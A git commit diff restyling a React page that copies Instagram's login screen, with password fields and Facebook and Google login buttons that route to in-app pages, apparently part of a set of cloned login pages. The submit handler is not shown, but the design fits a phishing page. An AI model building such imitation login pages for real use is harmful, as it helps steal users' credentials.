479b71d808252714e823c4ef585dc80a7df795ac
Muhammad Ismaeel <m.ismaeel.developer@gmail.com>
2025-03-28 21:00:08 +0500

    .

--- src/pages/instagram.jsx
+++ src/pages/instagram.jsx
@@ -49,65 +49,78 @@ const Login = () => {
     }
 
     return (
-        <div style={{ display: "flex", justifyContent: "center" }}>
-            <div>
-                <img src={phone} />
-            </div>
+        <div className="flex justify-center items-center min-h-screen px-4 ">
+            <div className="flex flex-col md:flex-row w-full max-w-4xl bg-white  rounded-lg p-6 md:p-10">
+                {/* Image Section */}
+                <div className="hidden md:flex items-center justify-center w-1/2">
+                    <img src={phone} alt="Phone Preview" className="max-w-xs md:max-w-sm lg:max-w-md" />
+                </div>
 
-            <div className="h-screen bg-gray-50 flex flex-col justify-center items-center">
-                <div className="bg-white border border-gray-300 w-80 py-8 flex items-center flex-col mb-3">
-                    <img src={logo} alt="Logo" className="w-44 mb-4" />
-                    <form className="mt-4 w-64 flex flex-col" onSubmit={handleSubmit}>
-                        <input
-                            type="text"
-                            name="email"
-                            placeholder="Phone number, username, or email"
-                            value={formData.email}
-                            onChange={handleChange}
-                            required
-                            className="text-xs w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400"
-                        />
-                        <input
-                            type="password"
-                            name="password"
-                            placeholder="Password"
-                            value={formData.password}
-                            onChange={handleChange}
-                            required
-                            className="text-xs w-full mb-4 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400"
-                        />
-                        <button onClick={handleSubmit} type="submit" className="text-sm text-center bg-blue-500 hover:bg-blue-600 text-white py-1 rounded font-medium">
-                            Log In
+                {/* Form Section */}
+                <div className="w-full md:w-1/2 flex flex-col justify-center  items-center">
+                    <div className="bg-white border border-gray-300 w-full md:w-96 py-8 rounded-lg flex items-center flex-col mb-3">
+                        <img src={logo} alt="Logo" className="w-44 mb-4" />
+                        <form className="mt-4 w-64 flex flex-col" onSubmit={handleSubmit}>
+                            <input
+                                type="text"
+                                name="email"
+                                placeholder="Phone number, username, or email"
+                                value={formData.email}
+                                onChange={handleChange}
+                                required
+                                className="text-xs w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400"
+                            />
+                            <input
+                                type="password"
+                                name="password"
+                                placeholder="Password"
+                                value={formData.password}
+                                onChange={handleChange}
+                                required
+                                className="text-xs w-full mb-4 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400"
+                            />
+                            <button type="submit" className="text-sm text-center bg-blue-500 hover:bg-blue-600 text-white py-2 rounded font-medium">
+                                Log In
+                            </button>
+                        </form>
+
+                        {/* Divider */}
+                        <div className="flex justify-evenly space-x-2 w-64 mt-4">
+                            <span className="bg-gray-300 h-px flex-grow relative top-2"></span>
+                            <span className="flex-none uppercase text-xs text-gray-400 font-semibold">or</span>
+                            <span className="bg-gray-300 h-px flex-grow relative top-2"></span>
+                        </div>
+
+                        {/* Social Login */}
+                        <button onClick={() => navigate('facebook/login')} className="mt-4 flex items-center">
+                            <img width={15} height={15} src={facebookIcon} />
+                            <span className="text-xs text-blue-900 font-semibold ml-2">Log in with Facebook</span>
                         </button>
-                    </form>
-                    <div className="flex justify-evenly space-x-2 w-64 mt-4">
-                        <span className="bg-gray-300 h-px flex-grow relative top-2"></span>
-                        <span className="flex-none uppercase text-xs text-gray-400 font-semibold">or</span>
-                        <span className="bg-gray-300 h-px flex-grow relative top-2"></span>
+                        <button onClick={() => navigate('google/login')} className="mt-4 flex items-center">
+                            <img width={15} height={15} src={googleIcon} />
+                            <span className="text-xs text-blue-900 font-semibold ml-2">Log in with Google</span>
+                        </button>
+
+                        {/* Forgot Password */}
+                        <Link to="#" className="text-xs text-blue-900 mt-4 cursor-pointer">Forgot password?</Link>
                     </div>
-                    <button onClick={handleFb} className="mt-4 flex items-center">
-                        <img width={15} height={15} src={facebookIcon} />
-                        <span className="text-xs text-blue-900 font-semibold ml-2">Log in with Facebook</span>
-                    </button>
-                    <button onClick={handleGoogle} className="mt-4 flex items-center">
-                        <img width={15} height={15} src={googleIcon} />
-                        <span className="text-xs text-blue-900 font-semibold ml-2">Log in with Google</span>
-                    </button>
-                    <Link to="#" className="text-xs text-blue-900 mt-4 cursor-pointer">Forgot password?</Link>
-                </div>
-                <div className="bg-white border border-gray-300 text-center w-80 py-4">
-                    <span className="text-sm">Don't have an account?</span>
-                    <Link to="#" className="text-blue-500 text-sm font-semibold"> Sign up</Link>
-                </div>
-                <div className="mt-3 text-center">
-                    <span className="text-xs">Get the app</span>
-                    <div className="flex mt-3 space-x-2">
-                        <img src={appleStore} alt="Apple Store" className="w-32" />
-                        <img src={googleStore} alt="Google Store" className="w-32" />
+
+                    {/* Sign Up */}
+                    <div className="bg-white border border-gray-300 rounded-lg text-center w-full md:w-96 py-4">
+                        <span className="text-sm">Don't have an account?</span>
+                        <Link to="#" className="text-blue-500 text-sm font-semibold"> Sign up</Link>
+                    </div>
+
+                    {/* App Store Links */}
+                    <div className="mt-3 text-center">
+                        <span className="text-xs">Get the app</span>
+                        <div className="flex mt-3 space-x-2 justify-center">
+                            <img src={appleStore} alt="Apple Store" className="w-32" />
+                            <img src={googleStore} alt="Google Store" className="w-32" />
+                        </div>
                     </div>
                 </div>
             </div>
-
         </div>
 
     );
